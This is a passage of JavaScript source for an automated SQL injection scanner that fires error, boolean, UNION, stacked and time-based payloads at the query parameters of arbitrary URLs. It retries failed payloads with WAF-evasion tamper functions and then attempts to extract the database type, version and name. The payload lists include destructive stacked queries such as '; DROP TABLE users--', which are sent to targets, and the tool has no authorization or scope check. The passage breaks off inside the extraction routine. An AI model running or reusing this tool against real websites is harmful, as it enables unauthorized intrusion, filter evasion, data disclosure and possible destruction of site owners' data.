import axios from 'axios';
import chalk from 'chalk';
import { createLogger } from '../utils/logger.js';
import { getDomainLogger } from '../utils/domainLogger.js';
import { resolveOutputPath, appendToFile } from '../utils/fileOperations.js';

/**
 * SQLInjectionTester
 * ------------------
 * Performs a series of SQL-Injection checks (error-based, boolean-based, union-based, time-based).
 * The tester uses plain HTTP(S) requests via axios. It does **not** rely on a Puppeteer browser
 * instance, but an existing browser Page can be supplied to piggy-back on an already rotated IP / cookie.
 */
export class SQLInjectionTester {
    constructor(config = {}, logger = null) {
        this.config = {
            timeout: config.timeout || 30000,
            verbose: config.verbose || false,
            delay: config.testDelay || 0,
            outputFile: config.outputFile || resolveOutputPath('vuln.txt'),
            detailsFile: config.detailsFile || resolveOutputPath('out-details.txt'),
            // Thresholds
            lengthDelta: config.lengthDelta || 100, // bytes difference considered interesting
            timeDelayThreshold: config.timeDelayThreshold || 4000, // ms
            ...config
        };

        this.logger = logger;
        this.stats = {
            totalUrls: 0,
            testedUrls: 0,
            totalVulnerableUrls: 0,
            confirmedVulnerableUrls: 0, // URLs with extracted DB info
            totalRequests: 0,
            vulnerableDetails: []
        };

        this.basePayloads = {
            error: ["'", "\"", "`", "'\""],
            boolean: ["' OR 1=1-- -", "' OR '1'='1'-- -"],
            union: ["' UNION SELECT {cols}-- -", "' UNION ALL SELECT {cols}-- -"],
            stacked: ["'; DROP TABLE users--", "'; SELECT pg_sleep(1)--"],
            time: ["' AND SLEEP({delay})-- -", "'; WAITFOR DELAY '00:00:0{delay}'-- -"]
        };
        
        // Add numeric (unquoted) payloads for parameters that don't use quotes
        this.numericPayloads = {
            error: ["", "9999999999", "-1"],
            boolean: [" AND 1=1-- -", " AND 1=2-- -", " OR 1=1-- -", " OR 1=2-- -"],
            union: [" UNION SELECT {cols}-- -", " UNION ALL SELECT {cols}-- -"],
            stacked: ["; DROP TABLE users--", "; SELECT pg_sleep(1)--"],
            time: [" AND SLEEP({delay})-- -", " AND (SELECT 5000 FROM (SELECT(SLEEP({delay})))test)-- -"]
        };

        // Tamper techniques for WAF bypass
        this.tamperTechniques = {
            caseVariation: (payload) => {
                return payload.replace(/union/gi, 'UnIoN')
                              .replace(/select/gi, 'SeLeCt')
                              .replace(/from/gi, 'FrOm')
                              .replace(/where/gi, 'WhErE');
            },
            spaceToComment: (payload) => payload.replace(/ /g, '/**/'),
            spaceToPlus: (payload) => payload.replace(/ /g, '+'),
            doubleDecode: (payload) => encodeURIComponent(encodeURIComponent(payload)),
            hexEncode: (payload) => {
                return payload.split('').map(char => {
                    if (/[a-zA-Z]/.test(char)) {
                        return `CHAR(${char.charCodeAt(0)})`;
                    }
                    return char;
                }).join('');
            },
            commentsInside: (payload) => {
                return payload.replace(/UNION/gi, 'UN/**/ION')
                              .replace(/SELECT/gi, 'SE/**/LECT')
                              .replace(/AND/gi, 'A/**/ND');
            },
            randomCase: (payload) => {
                return payload.split('').map(char => {
                    if (/[a-zA-Z]/.test(char)) {
                        return Math.random() > 0.5 ? char.toUpperCase() : char.toLowerCase();
                    }
                    return char;
                }).join('');
            },
            versionComment: (payload) => payload.replace(/--\s*-/g, '--+'),
            scientificNotation: (payload) => payload.replace(/(\d+)/g, match => `${match}e0`),
            concat: (payload) => {
                // Replace strings with CONCAT for MySQL
                return payload.replace(/'([^']+)'/g, (match, str) => {
                    return 'CONCAT(' + str.split('').map(c => `CHAR(${c.charCodeAt(0)})`).join(',') + ')';
                });
            }
        };

        // Generate payloads on construction
        this.payloads = this._generatePayloads();
    }

    /**
     * Create a rich set of payloads with randomised values so each run differs.
     */
    _generatePayloads() {
        const randInt = (min, max) => Math.floor(Math.random() * (max - min + 1)) + min;

        const payloads = {};

        // Error based – static list is fine
        payloads.error = [...this.basePayloads.error];

        // Boolean based – vary numeric comparisons
        payloads.boolean = [];
        for (let i = 0; i < 3; i++) {
            const a = randInt(1, 5);
            const b = randInt(6, 10);
            payloads.boolean.push(`' OR ${a}=${a}-- -`);
            payloads.boolean.push(`" OR ${a}=${a}#`);
            payloads.boolean.push(`') OR (${a}=${a}/*`);
            payloads.boolean.push(`' OR ${a}=${b}-- -`); // false case to compare
        }

        // UNION injections – try 1-6 columns
        payloads.union = [];
        for (let cols = 1; cols <= 6; cols++) {
            const list = Array.from({ length: cols }, (_, idx) => idx + 1).join(',');
            this.basePayloads.union.forEach(t => {
                payloads.union.push(t.replace('{cols}', list));
            });
        }
        
        // Add negative ID UNION payloads for better compatibility
        payloads.union.push("-999' UNION SELECT 1-- -");
        payloads.union.push("-999' UNION SELECT 1,2-- -");
        payloads.union.push("-999' UNION SELECT 1,2,3-- -");
        
        // Stacked queries – include random benign statements
        payloads.stacked = [];
        const benign = ['SELECT 1', 'SELECT @@version', 'SELECT NULL'];
        benign.forEach(b => {
            payloads.stacked.push(`'; ${b}--`);
        });

        // Time based – vary delays 3-8 seconds
        payloads.time = [];
        const delay = randInt(3, 6);
        this.basePayloads.time.forEach(t => {
            payloads.time.push(t.replace(/{delay}/g, delay));
        });
        
        // Add numeric (unquoted) payloads
        // Numeric error-based
        payloads.error.push(...this.numericPayloads.error);
        
        // Numeric boolean-based
        payloads.boolean.push(...this.numericPayloads.boolean);
        
        // Numeric UNION with columns
        for (let cols = 1; cols <= 6; cols++) {
            const list = Array.from({ length: cols }, () => 'NULL').join(',');
            this.numericPayloads.union.forEach(t => {
                payloads.union.push(t.replace('{cols}', list));
            });
        }
        
        // Numeric stacked queries
        payloads.stacked.push(...this.numericPayloads.stacked);
        
        // Numeric time-based with random delays
        this.numericPayloads.time.forEach(t => {
            payloads.time.push(t.replace(/{delay}/g, delay));
        });

        return payloads;
    }

    async initialize() {
        if (!this.logger) {
            // Get log level from config or use default
            const logLevel = this.config.logLevel || 'debug';
            this.logger = await createLogger(false, true, logLevel);
        }
        this.logger.info('SQLInjectionTester initialised');
    }

    /**
     * Test an array of URLs for SQL-Injection vulnerabilities.
     * @param {string[]} urls
     * @param {object} _browser Ignored – kept for API parity with other call-sites.
     */
    async testUrls(urls = [], _browser = null) {
        this.stats.totalUrls = urls.length;
        const results = [];

        for (const url of urls) {
            try {
                const res = await this._testSingleUrl(url);
                results.push(res);
                if (res.vulnerable) {
                    await this._saveVulnerableUrl(res.url);
                }
            } catch (err) {
                this.logger.error('Error testing URL', { url, error: err.message });
                results.push({ url, vulnerable: false, error: err.message });
            }
        }
        return results;
    }

    getStats() {
        return this.stats;
    }

    async cleanup() {
        // Nothing to cleanup for axios based tester currently
    }

    /* ------------------- Private Helpers ------------------- */

    async _testSingleUrl(targetUrl) {
        this.stats.testedUrls += 1;
        const result = { url: targetUrl, vulnerable: false, vulnerabilities: [] };
        
        // Parse URL first to get host
        let urlObj;
        try {
            urlObj = new URL(targetUrl);
        } catch {
            this.logger?.error(`Invalid URL format: ${targetUrl}`);
            throw new Error('Invalid URL');
        }
        
        // Extract host for cleaner CLI output
        const urlHost = urlObj.host;
        console.log(chalk.blue(`\n🔍 Starting SQL injection test on ${urlHost}...`));
        
        // Get domain-specific logger
        const domainLogger = await getDomainLogger(targetUrl);
        domainLogger.info(`Starting SQL injection test for URL: ${targetUrl}`);
        this.logger?.info(`Starting SQL injection test for URL: ${targetUrl}`);

        // Get baseline response
        let baseline;
        try {
            const start = Date.now();
            this.logger?.debug(`Sending baseline request to: ${targetUrl}`);
            const resp = await axios.get(targetUrl, { timeout: this.config.timeout, validateStatus: () => true });
            const duration = Date.now() - start;
            const bodyStr = resp.data ? resp.data.toString() : '';
            const globalErrRegex = /(sql syntax|mysql_fetch|ORA-\d+|SQLiteException|MariaDB|SQLSTATE|syntax error|Warning.*mysql|Unclosed quotation mark after the character string)/i;
            baseline = {
                status: resp.status,
                length: bodyStr.length,
                body: bodyStr.slice(0, 1000),
                duration,
                errorInBaseline: globalErrRegex.test(bodyStr)
            };
            this.stats.totalRequests += 1;
            this.logger?.info(`Baseline established for ${targetUrl}`, {
                status: baseline.status,
                length: baseline.length,
                duration: baseline.duration,
                errorInBaseline: baseline.errorInBaseline
            });
            if (this.config.verbose) {
                this.logger.debug(`Baseline for ${targetUrl} – status ${baseline.status}, len ${baseline.length}, time ${duration}ms`);
            }
        } catch (error) {
            this.logger?.error(`Baseline request failed for ${targetUrl}`, { error: error.message });
            throw new Error(`Baseline request failed – ${error.message}`);
        }

        // Parse query parameters (urlObj already declared and initialized above)

        // Iterate parameters
        const params = Array.from(urlObj.searchParams.keys());
        this.logger?.info(`Found ${params.length} parameters to test: ${params.join(', ')}`);
        if (params.length === 0) {
            this.logger?.warn(`No query parameters found in URL: ${targetUrl}`);
            return { ...result, note: 'No query parameters' };
        }

        for (const param of params) {
            const originalVal = urlObj.searchParams.get(param) || '';
            this.logger?.debug(`Testing parameter '${param}' with original value: ${originalVal}`);
            
            // Log parameter testing start to domain logger
            const domainLogger = await getDomainLogger(targetUrl);
            domainLogger.debug(`Testing parameter '${param}' with original value: ${originalVal}`);

            // For each payload type
            for (const [type, payloadsArr] of Object.entries(this.payloads)) {
                // Show progress in CLI
                process.stdout.write(`\r⚡ Testing ${type.toUpperCase()} injection on ${urlHost} [${param}]...${' '.repeat(20)}`);
                this.logger?.debug(`Testing ${type} injection on parameter '${param}'`);
                domainLogger.debug(`Testing ${type} injection on parameter '${param}'`);
                for (const payload of payloadsArr) {
                    const injectedVal = originalVal + payload;
                    // Clone the URL for each test to avoid modifying the original
                    const testUrlObj = new URL(targetUrl);
                    testUrlObj.searchParams.set(param, injectedVal);
                    const testUrl = testUrlObj.toString();
                    
                    this.logger?.debug(`Testing payload on ${param}`, {
                        type,
                        payload: payload,
                        fullTestUrl: testUrl,
                        parameter: param,
                        originalValue: originalVal,
                        injectedValue: injectedVal
                    });
                    
                    // Add debug logging to domain logger for individual payload tests
                    domainLogger.debug(`Testing payload: ${payload} on parameter ${param} (${type})`);

                    // Try normal payload first
                    let testOutcome = await this._sendAndCompare(testUrl, baseline, type, payload);
                    
                    // If not vulnerable and it's a promising payload, try with tamper techniques
                    if (!testOutcome.vulnerable && type !== 'time') {
                        for (let tamperAttempt = 1; tamperAttempt <= 3; tamperAttempt++) {
                            this.logger?.debug(`Retrying with tamper technique ${tamperAttempt}`, {
                                type,
                                payload,
                                param
                            });
                            
                            testOutcome = await this._sendAndCompare(testUrl, baseline, type, payload, tamperAttempt);
                            
                            if (testOutcome.vulnerable) {
                                this.logger?.info(`Tamper technique ${tamperAttempt} succeeded!`, {
                                    type,
                                    payload,
                                    param
                                });
                                break;
                            }
                        }
                    }
                    
                    this.logger?.info(`Payload test result for ${param}`, {
                        type,
                        payload: payload,
                        fullTestUrl: testUrl,
                        vulnerable: testOutcome.vulnerable,
                        evidence: testOutcome.evidence,
                        responseTime: testOutcome.responseTime,
                        parameter: param,
                        originalValue: originalVal,
                        injectedValue: injectedVal
                    });
                     
                    if (testOutcome.vulnerable) {
                        this.logger?.warn(`Potential vulnerability detected for ${param}`, {
                            type,
                            payload: payload,
                            fullTestUrl: testUrl,
                            evidence: testOutcome.evidence,
                            responseTime: testOutcome.responseTime,
                            parameter: param,
                            originalValue: originalVal,
                            injectedValue: injectedVal,
                            host: urlObj.host
                        });
                         
                        // CRITICAL: Attempt database extraction to confirm it's real SQL injection
                        this.logger?.info(`Attempting database extraction to confirm vulnerability`);
                        // Pass the original URL object, not the injected one
                        const dbInfo = await this._attemptDbExtraction(urlObj, param, {
                            vulnType: type,
                            hint: testOutcome.dbTypeHint,
                        });
                        
                        // Skip if URL is a static file (PDF, image, etc)
                        const fileExtension = urlObj.pathname.split('.').pop().toLowerCase();
                        const staticFileExtensions = ['pdf', 'jpg', 'jpeg', 'png', 'gif', 'svg', 'doc', 'docx', 'xls', 'xlsx', 'zip', 'rar'];
                        if (staticFileExtensions.includes(fileExtension)) {
                            this.logger?.warn(`Skipping static file URL: ${urlObj.pathname}`);
                            continue;
                        }
                        
                        // For UNION injections, if we can successfully inject with different column counts,
                        // it's very likely a real vulnerability even without full DB extraction
                        const isLikelyRealVuln = (
                            type === 'union' || 
                            type === 'boolean' || 
                            type === 'time' ||
                            (dbInfo && this._isValidDatabaseInfo(dbInfo) && (dbInfo.type || dbInfo.version || dbInfo.name))
                        );
                         
                        if (!isLikelyRealVuln) {
                            // No DB info extracted = likely false positive
                            const domainLogger = await getDomainLogger(targetUrl);
                            domainLogger.logSqlInjection('FALSE POSITIVE detected', {
                                url: targetUrl,
                                parameter: param,
                                payload: payload,
                                type: type,
                                evidence: testOutcome.evidence,
                                reason: 'No valid database information extracted'
                            });
                            
                            this.logger?.debug(`FALSE POSITIVE detected for ${urlObj.host}`, {
                                parameter: param,
                                type,
                                payload: payload
                            });
                            continue; // Skip this payload, try next one
                        }

                        // Confirmed vulnerability with DB extraction
                        if (!result.vulnerable) result.vulnerable = true;
                        if (!result.database) {
                            result.database = dbInfo;
                            
                            // Mark as confirmed if we have DB name and version
                            const isConfirmed = dbInfo && dbInfo.name && dbInfo.version;
                            
                            if (isConfirmed) {
                                console.log(chalk.green.bold(`\n✅ CONFIRMED SQL INJECTION with DB extraction!`));
                                
                                // Get domain logger for this URL
                                const domainLogger = await getDomainLogger(targetUrl);
                                domainLogger.logSqlInjection('CONFIRMED SQL INJECTION VULNERABILITY WITH FULL DB INFO', {
                                    url: targetUrl,
                                    parameter: param,
                                    payload: payload,
                                    type: type,
                                    evidence: testOutcome.evidence,
                                    dbHint: dbInfo,
                                    extractedData: dbInfo
                                });
                                
                                this.logger?.info(`CONFIRMED SQL INJECTION logged to domain-specific log`, {
                                    host: urlObj.host,
                                    url: targetUrl
                                });
                            } else {
                                console.log(chalk.yellow.bold(`\n⚠️ POTENTIAL SQL INJECTION (partial extraction)`));
                                
                                // Get domain logger for this URL
                                const domainLogger = await getDomainLogger(targetUrl);
                                domainLogger.logSqlInjection('POTENTIAL SQL INJECTION VULNERABILITY', {
                                    url: targetUrl,
                                    parameter: param,
                                    payload: payload,
                                    type: type,
                                    evidence: testOutcome.evidence,
                                    dbHint: dbInfo,
                                    extractedData: dbInfo
                                });
                                
                                this.logger?.info(`POTENTIAL SQL INJECTION logged to domain-specific log`, {
                                    host: urlObj.host,
                                    url: targetUrl
                                });
                            }
                            
                            // Save detailed vulnerability info
                            await this._saveVulnerabilityDetails({
                                url: targetUrl,
                                exploitUrl: testUrl,
                                parameter: param,
                                type,
                                payload,
                                database: dbInfo,
                                confirmed: isConfirmed,
                                timestamp: new Date().toISOString()
                            });
                        }

                        result.vulnerabilities.push({
                            type,
                            parameter: param,
                            payload,
                            url: testUrl,
                            evidence: testOutcome.evidence,
                            responseTime: testOutcome.responseTime,
                            database: dbInfo
                        });
                          
                        this.logger?.info(`Vulnerability added to results`, {
                            totalVulnerabilities: result.vulnerabilities.length
                        });
                        // If any payload hits, we can break earlier to save requests
                        break;
                    }
                    // Delay between payloads if configured
                    if (this.config.delay) {
                        this.logger?.debug(`Applying delay of ${this.config.delay}ms between payloads`);
                        await new Promise(r => setTimeout(r, this.config.delay));
                    }
                }
                // Break out of type loop if vulnerability found
                if (result.vulnerabilities.length > 0) {
                    this.logger?.info(`Stopping further tests for parameter '${param}' - vulnerability already found`);
                    break;
                }
            }
            // Break out of parameter loop if vulnerability found
            if (result.vulnerabilities.length > 0) {
                this.logger?.info(`Stopping all tests for URL - vulnerability already found`);
                break;
            }
        }

        if (result.vulnerable) {
            this.stats.totalVulnerableUrls += 1;
            
            // Check if it's a confirmed vulnerability (has DB name and version)
            const isConfirmed = result.database && result.database.name && result.database.version;
            if (isConfirmed) {
                this.stats.confirmedVulnerableUrls += 1;
            }
            
            this.stats.vulnerableDetails.push({ 
                url: targetUrl, 
                count: result.vulnerabilities.length,
                confirmed: isConfirmed 
            });
            
            // Clear the progress line
            process.stdout.write('\r' + ' '.repeat(80) + '\r');
            
            if (isConfirmed) {
                const domainLogger = await getDomainLogger(targetUrl);
                domainLogger.logSqlInjection('URL CONFIRMED VULNERABLE WITH FULL DB EXTRACTION', {
                    url: targetUrl,
                    vulnerabilityCount: result.vulnerabilities.length,
                    extractedData: result.database
                });
                
                this.logger?.info(`URL confirmed vulnerable`, {
                    url: targetUrl,
                    confirmed: true
                });
            } else {
                const domainLogger = await getDomainLogger(targetUrl);
                domainLogger.logSqlInjection('URL POTENTIALLY VULNERABLE', {
                    url: targetUrl,
                    vulnerabilityCount: result.vulnerabilities.length,
                    extractedData: result.database
                });
                
                this.logger?.info(`URL potentially vulnerable`, {
                    url: targetUrl,
                    confirmed: false
                });
            }
        } else {
            // Clear the progress line
            process.stdout.write('\r' + ' '.repeat(80) + '\r');
            console.log(chalk.gray(`✓ ${urlHost} - No vulnerabilities found`));
            this.logger?.info(`URL tested clean - no vulnerabilities found: ${targetUrl}`);
        }
          
        return result;
    }

    async _sendAndCompare(testUrl, baseline, type, payload, tamperAttempt = 0) {
        try {
            // Apply tamper techniques if previous attempts failed
            let finalUrl = testUrl;
            let tamperedPayload = payload;
            
            if (tamperAttempt > 0) {
                const urlObj = new URL(testUrl);
                const params = Array.from(urlObj.searchParams.entries());
                const tamperMethods = Object.keys(this.tamperTechniques);
                const tamperMethod = tamperMethods[tamperAttempt % tamperMethods.length];
                
                // Find parameter with payload and apply tamper
                for (const [param, value] of params) {
                    if (value.includes(payload)) {
                        tamperedPayload = this.tamperTechniques[tamperMethod](payload);
                        const newValue = value.replace(payload, tamperedPayload);
                        urlObj.searchParams.set(param, newValue);
                        finalUrl = urlObj.toString();
                        this.logger?.debug(`Applied tamper technique: ${tamperMethod}`, { 
                            original: payload, 
                            tampered: tamperedPayload,
                            attempt: tamperAttempt
                        });
                        break;
                    }
                }
            }
            
            this.logger?.debug(`Sending test request`, { 
                fullTestUrl: finalUrl, 
                type,
                payload: tamperedPayload,
                tamperAttempt
            });
            const start = Date.now();
            const resp = await axios.get(finalUrl, { timeout: this.config.timeout, validateStatus: () => true });
            const duration = Date.now() - start;
            this.stats.totalRequests += 1;
            
            const bodyText = resp.data ? resp.data.toString() : '';
            
            // Only log basic info unless vulnerable
            this.logger?.debug(`Test response received`, {
                status: resp.status,
                duration,
                contentLength: bodyText.length,
                type,
                payload: payload
            });
            const length = bodyText.length;
            const statusChanged = resp.status !== baseline.status;
            const lengthChanged = Math.abs(length - baseline.length) > this.config.lengthDelta;

            // Check if response is likely JavaScript/JSON before checking for SQL errors
            const isLikelyJavaScript = (text) => {
                // Check for common JS/JSON patterns
                const jsPatterns = [
                    /"feature[A-Z]\w+":\s*(true|false)/,  // Feature flags like "featureCart":false
                    /\{[^}]*"[^"]+"\s*:\s*[^,}]+[,}]/,    // JSON object patterns
                    /function\s*\(/,                        // Function declarations
                    /\.(prototype|constructor)\s*=/,        // Prototype assignments
                    /var\s+\w+\s*=/,                       // Variable declarations
                    /const\s+\w+\s*=/,                     // Const declarations
                    /let\s+\w+\s*=/,                       // Let declarations
                    /\$\(|jQuery\(/,                       // jQuery calls
                    /window\.|document\./,                 // DOM access
                    /\.addEventListener\(/,               // Event listeners
                    /Promise\.|async\s+function/,          // Modern JS
                    /"use strict"/                         // Strict mode
                ];
                
                // If text contains multiple feature flags, it's likely a config object
                const featureFlagCount = (text.match(/"feature\w+":\s*(true|false)/g) || []).length;
                if (featureFlagCount > 5) return true;
                
                // Check for any JS patterns
                return jsPatterns.some(pattern => pattern.test(text));
            };

            // Enhanced SQL error detection - very specific patterns to avoid JS false positives
            const errorPatterns = [
                // MySQL/MariaDB specific errors - must have clear SQL context
                /You have an error in your SQL syntax.*check the manual.*MySQL/i,
                /MySQL server version for the right syntax to use near/i,
                /Warning:\s+(mysql[i]?_\w+)\(\):/i,  // PHP MySQL function errors
                /MySQL Error\s*\d+:/i,
                /SQLSTATE\[\w+\]\s*\[\d+\]/i,
                
                // Oracle errors - with error codes
                /ORA-\d{5}:\s+/i,
                /Oracle.*error\s*ORA-/i,
                /TNS-\d+:\s+/i,
                
                // PostgreSQL errors
                /PostgreSQL.*ERROR:\s+/i,
                /pg_query\(\).*failed:/i,
                /psql:\s+ERROR:\s+/i,
                /ERROR:\s+relation .* does not exist/i,
                
                // SQL Server errors
                /\[Microsoft\]\[ODBC SQL Server Driver\]/i,
                /\[Microsoft\]\[SQL Server Native Client/i,
                /Unclosed quotation mark after the character string/i,
                /Incorrect syntax near the keyword/i,
                /Msg \d+, Level \d+, State \d+/i,
                
                // SQLite errors
                /SQLite error:\s+/i,
                /SQLiteException:\s+/i,
                /no such table:/i,
                
                // PHP database errors with SQL context
                /Fatal error:.*SQL.*syntax/i,
                /PDOException:.*SQLSTATE\[\w+\]/i,
                /mysqli.*error/i,
                
                // Access/Jet database
                /Microsoft Access.*Driver.*Syntax error/i,
                /Microsoft JET Database.*Engine error/i
            ];
            
            // Skip SQL error detection if the response is clearly JavaScript/JSON
            const errorMatch = !isLikelyJavaScript(bodyText) && errorPatterns.some(pattern => pattern.test(bodyText));
            const errorRegex = errorMatch ? errorPatterns.find(pattern => pattern.test(bodyText)) : null;

            // Get a hint about the DB type from the error message to guide extraction
            let dbTypeHint = null;
            if (errorMatch) {
                dbTypeHint = this._parseDbInfoFromText(bodyText);
                this.logger?.debug(`Database type hinted from error message`, {
                    dbTypeHint,
                    payload: payload,
                    fullTestUrl: testUrl
                });
            }

            // Additional validation: check if response looks like a real SQL error vs generic error page
            const genericErrorIndicators = [
                /server error/i,
                /internal error/i,
                /an error occurred/i,
                /system administrator/i,
                /contact.*administrator/i,
                /error 500/i,
                /something went wrong/i
            ];
            const isGenericError = genericErrorIndicators.some(regex => regex.test(bodyText));
            
            // Get domain logger for this URL
            const domainLogger = await getDomainLogger(finalUrl);
            
            // Log error detection and DB hints
            if (errorMatch && !baseline.errorInBaseline) {
                // Extract only relevant response parts
                const errorKeyword = errorMatch[0] || 'error';
                const relevantResponse = this._extractRelevantResponse(bodyText, errorKeyword);
                
                this.logger?.warn(`Error-based injection detected`, {
                    errorMatch,
                    isGenericError,
                    payload: tamperedPayload,
                    fullTestUrl: finalUrl,
                    errorEvidence: relevantResponse,
                    tamperAttempt
                });
                
                // Log HTML response (only relevant parts) to domain logger
                domainLogger.logHtmlResponse('SQL error detected in response', relevantResponse);
                
                // Log DB hint if found
                if (dbTypeHint) {
                    domainLogger.logSqlInjection('Database type hint detected', {
                        url: finalUrl,
                        parameter: tamperedPayload.includes('=') ? finalUrl.split('?')[1].split('&')[0].split('=')[0] : 'unknown',
                        payload: tamperedPayload,
                        type: type,
                        dbHint: dbTypeHint,
                        evidence: errorKeyword
                    });
                }
            }
            
            this.logger?.debug(`Response analysis`, {
                statusChanged,
                lengthChanged: lengthChanged ? `${baseline.length} -> ${length}` : false,
                errorMatch,
                isGenericError,
                type,
                payload: payload,
                fullTestUrl: testUrl,
                baselineStatus: baseline.status,
                testStatus: resp.status,
                baselineLength: baseline.length,
                testLength: length,
                lengthDelta: Math.abs(length - baseline.length)
            });

            if (type === 'time') {
                // More strict time-based validation
                const expectedDelay = this._extractDelayFromPayload(payload);
                const actualDelay = duration - baseline.duration;
                this.logger?.debug(`Time-based analysis`, {
                    expectedDelay,
                    actualDelay,
                    baselineDuration: baseline.duration,
                    testDuration: duration,
                    threshold: expectedDelay * 1000 * 0.8,
                    payload: payload,
                    fullTestUrl: testUrl,
                    type
                });
                if (actualDelay >= (expectedDelay * 1000 * 0.8)) { // 80% of expected delay
                    this.logger?.warn(`Time-based injection detected`, { 
                        actualDelay, 
                        expectedDelay,
                        payload: payload,
                        fullTestUrl: testUrl,
                        baselineDuration: baseline.duration,
                        testDuration: duration
                    });
                    return { vulnerable: true, evidence: `Delayed response ${duration}ms`, responseTime: duration };
                }
            } else if (type === 'error') {
                // Skip if baseline already had error
                if (!baseline.errorInBaseline && errorMatch && !isGenericError) {
                    // Extract the actual error message for evidence
                    const errorMessageMatch = bodyText.match(errorRegex);
                    const errorKeyword = errorMessageMatch ? errorMessageMatch[0] : 'error';
                    const errorSnippet = this._extractRelevantResponse(bodyText, errorKeyword);
                    
                    this.logger?.warn(`Error-based injection detected`, { 
                        errorMatch: true, 
                        isGenericError,
                        payload: tamperedPayload,
                        fullTestUrl: finalUrl,
                        errorEvidence: errorSnippet,
                        tamperAttempt
                    });
                    return { vulnerable: true, evidence: `Database error: ${errorSnippet}`, responseTime: duration, dbTypeHint };
                }
            } else if (type === 'boolean') {
                // For boolean, be more strict - require significant changes
                if (statusChanged && lengthChanged && !isGenericError) {
                    this.logger?.warn(`Boolean injection detected (status+length change)`, {
                        statusChanged,
                        lengthChanged,
                        isGenericError,
                        payload,
                        fullTestUrl: testUrl,
                        baselineStatus: baseline.status,
                        testStatus: resp.status,
                        baselineLength: baseline.length,
                        testLength: length
                    });
                    return { vulnerable: true, evidence: 'Boolean injection confirmed (status & length change)', responseTime: duration };
                } else if (errorMatch && !baseline.errorInBaseline && !isGenericError) {
                    const errorKeyword = errorMatch[0] || 'error';
                    const relevantSnippet = this._extractRelevantResponse(bodyText, errorKeyword);
                    
                    this.logger?.warn(`Boolean injection with DB error detected`, {
                        errorMatch,
                        isGenericError,
                        payload: tamperedPayload,
                        fullTestUrl: finalUrl,
                        responsePreview: relevantSnippet,
                        tamperAttempt
                    });
                    return { vulnerable: true, evidence: 'Boolean injection with database error', responseTime: duration, dbTypeHint };
                }
            } else if (type === 'stacked') {
                if ((statusChanged || lengthChanged || (errorMatch && !baseline.errorInBaseline)) && !isGenericError) {
                    this.logger?.warn(`Stacked query injection detected`, {
                        statusChanged,
                        lengthChanged,
                        errorMatch,
                        isGenericError,
                        payload,
                        fullTestUrl: testUrl,
                        baselineStatus: baseline.status,
                        testStatus: resp.status,
                        baselineLength: baseline.length,
                        testLength: length
                    });
                    const evidence = errorMatch ? 'SQL error after stacked query' : 'Response anomaly after stacked query';
                    return { vulnerable: true, evidence, responseTime: duration };
                }
            } else if (type === 'union') {
                if ((statusChanged || lengthChanged || (errorMatch && !baseline.errorInBaseline)) && !isGenericError) {
                    this.logger?.warn(`UNION injection detected`, {
                        statusChanged,
                        lengthChanged,
                        errorMatch,
                        isGenericError,
                        payload,
                        fullTestUrl: testUrl,
                        baselineStatus: baseline.status,
                        testStatus: resp.status,
                        baselineLength: baseline.length,
                        testLength: length
                    });
                    const evidence = statusChanged
                        ? 'UNION injection (status change)'
                        : lengthChanged
                        ? 'UNION injection (length change)'
                        : 'UNION injection (SQL error)';
                    return { vulnerable: true, evidence, responseTime: duration };
                }
            }

            // No indicators – considered safe
            return { vulnerable: false };

        } catch (error) {
            this.logger?.error(`Error during test request`, {
                fullTestUrl: testUrl,
                error: error.message,
                payload,
                type,
                errorStack: error.stack
            });
            return { vulnerable: false, error: error.message };
        }
    }
    
    /**
     * Extracts structured DB info from text using a variety of regex patterns.
     */
    _parseDbInfoFromText(bodyText) {
        if (!bodyText) return null;

        const dbInfo = { type: null, version: null, name: null };

        // Database type detection
        const typePatterns = [
            { regex: /mysql/i, type: 'MySQL' },
            { regex: /mariadb/i, type: 'MariaDB' },
            { regex: /microsoft.*sql.*server/i, type: 'Microsoft SQL Server' },
            { regex: /postgresql/i, type: 'PostgreSQL' },
            { regex: /oracle/i, type: 'Oracle' },
            { regex: /sqlite/i, type: 'SQLite' }
        ];

        for (const { regex, type } of typePatterns) {
            if (regex.test(bodyText)) {
                dbInfo.type = type;
                break;
            }
        }

        // Version extraction - look for actual version numbers
        const versionPatterns = [
            // MySQL version patterns
            /(\d+\.\d+\.\d+(?:-\w+)?)-log/i,
            /mysql\s+(\d+\.\d+\.\d+)/i,
            /mariadb\s+(\d+\.\d+\.\d+)/i,
            // Generic version patterns
            /version[:\s]+(\d+\.\d+\.\d+(?:\.\d+)?)/i,
            /(\d+\.\d+\.\d+\.\d+)/,
            // Extract from DB_INFO markers
            /DB_INFO:([^|]+)\|/i,
            // Extract from XML error tags
            /~([^~]+)~/,
            // Extract from EXTRACTVALUE errors
            /XPATH syntax error:\s*'~([^~']+)'/i
        ];

        for (const pattern of versionPatterns) {
            const match = bodyText.match(pattern);
            if (match && match[1]) {
                const version = match[1].trim();
                // Skip obvious error codes
                if (!version.match(/^40[0-9]\./)) {
                    dbInfo.version = version;
                    break;
                }
            }
        }

        // Database name extraction patterns
        const namePatterns = [
            // From DB_INFO markers
            /DB_INFO:[^|]*\|([^|]+)\|/i,
            // From structured extraction
            /\|DB:([^|]+)\|/,
            /\|ALL:([^<\s]+)/,
            // From error messages - more specific
            /database\s+(?:is|name|:)\s*['"` ]?([a-zA-Z0-9_]+)['"` ]?/i,
            /schema\s+(?:is|name|:)\s*['"` ]?([a-zA-Z0-9_]+)['"` ]?/i,
            /Unknown database\s+['"` ]([a-zA-Z0-9_]+)['"` ]/i,
            /Table\s+'[^.]+\.([^']+)'/i, // Table 'database.table'
            // From EXTRACTVALUE errors
            /~[^|]*\|([^|~]+)~/,
            // From conversion errors
            /converting the \w+ value '([^']+)' to data type/i
        ];

        for (const pattern of namePatterns) {
            const match = bodyText.match(pattern);
            if (match && match[1]) {
                const name = match[1].trim();
                // Skip common non-database words and JS libraries
                const blacklist = ['null', 'undefined', 'error', 'warning', 'info', 'debug', 
                                 'magiczoom', 'jquery', 'bootstrap', 'react', 'angular', 'vue'];
                if (name.length > 2 && !blacklist.includes(name.toLowerCase())) {
                    dbInfo.name = name;
                    break;
                }
            }
        }

        // If we found any information, return it
        if (dbInfo.type || dbInfo.version || dbInfo.name) {
            return dbInfo;
        }

        return { type: null, version: null, name: null };
    }

    /**
     * A more robust multi-stage attempt to extract database information
     */
    async _attemptDbExtraction(baseUrlObj, param, vulnContext) {
        const { vulnType, hint } = vulnContext;
        this.logger?.info(`Starting database extraction`, { host: baseUrlObj.host, param, hint });
        
        // Get domain logger
        const domainLogger = await getDomainLogger(baseUrlObj.toString());

        const dbInfo = {
            type: hint?.type || null,
            version: hint?.version || null,
